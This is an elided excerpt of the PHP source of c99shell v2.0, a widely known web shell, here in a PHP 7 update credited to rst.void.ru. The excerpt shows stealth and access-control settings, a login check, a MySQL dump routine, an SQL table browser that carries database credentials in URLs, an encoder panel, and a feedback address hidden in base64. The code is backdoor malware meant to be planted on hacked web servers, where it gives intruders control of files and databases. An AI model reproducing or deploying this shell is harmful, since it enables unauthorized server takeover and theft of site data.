...
*			c99shell.php v.2.0 (PHP 7) (02.02.2019) Updated by: rst.void.ru for PHP 7
*			https://www.rst.void.ru
******************************************************************************************************
*/
...
$shver = "2.0 [PHP 7 Update] [02.02.2019]";
if (!empty($unset_surl))
{
...
$accessdeniedmess = "<a href=\"https://www.rst.void.ru\">c99shell v." . $shver . "</a>: access denied";
$gzipencode = true;
$updatenow = false;
$c99sh_updateurl = "https://www.rst.void.ru/";
$c99sh_sourcesurl = "https://www.rst.void.ru/";
$filestealth = true;
...
{
    exit("<a href=\"https://www.rst.void.ru\">c99shell</a>: Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (!empty($login))
{
    if (empty($md5_pass))
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by C99Shell.SQL v. " . $shver . "
					# Home page: http://www.rst.void.ru
					#
					# Host settings:
...
";
        ...
        function mysql_query_form()
        {
            ...
            if ((!$submit) or ($sql_act))
            {
                ...
                if ($tbl_struct)
                {
                    ...
                    {
                        $name = $field["Field"];
                        echo "t <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`" . $name . "`';\"><b>" . $name . "</b></a><br>";
                    }
                    echo "</td></tr></table>";
                }
            }
            ...
            { ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl . "act=sql&sql_login=" . htmlspecialchars($sql_login) . "&sql_passwd=" . htmlspecialchars($sql_passwd) . "&sql_server=" . htmlspecialchars($sql_server) . "&sql_port=" . htmlspecialchars($sql_port) . "&"; ?>"><b>Home</b></a><hr size="1" noshade><?php $result = mysql_list_tables($sql_db);
                ...
                else
                {
                    ...
                    while ($row = mysql_fetch_array($result))
                    {
                        ...
                        echo "<b>t&nbsp;<a href=\"" . $sql_surl . "sql_db=" . htmlspecialchars($sql_db) . "&sql_tbl=" . htmlspecialchars($row[0]) . "\"><b>" . htmlspecialchars($row[0]) . "</b></a> (" . $count_row[0] . ")</br></b>";
 ...
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"" . base64_encode($encoder_input) . "\" readonly></center>";
    ...
    if ($act == "feedback")
    {
        $suppmail = base64_decode("dGlja2V0aWRtZXNzYWdlQGhvdG1haWwuY29t");
        if (!empty($submit))
        {
...
if ($act == "about")
{
    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell.<br><br>and <u>rst.void.ru</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in http://www.rst.void.ru </b>";
} ?>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> rst.void.ru | <a href="http://www.rst.void.ru"><font color="#FF0000">C99Shell rst.void.ru</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
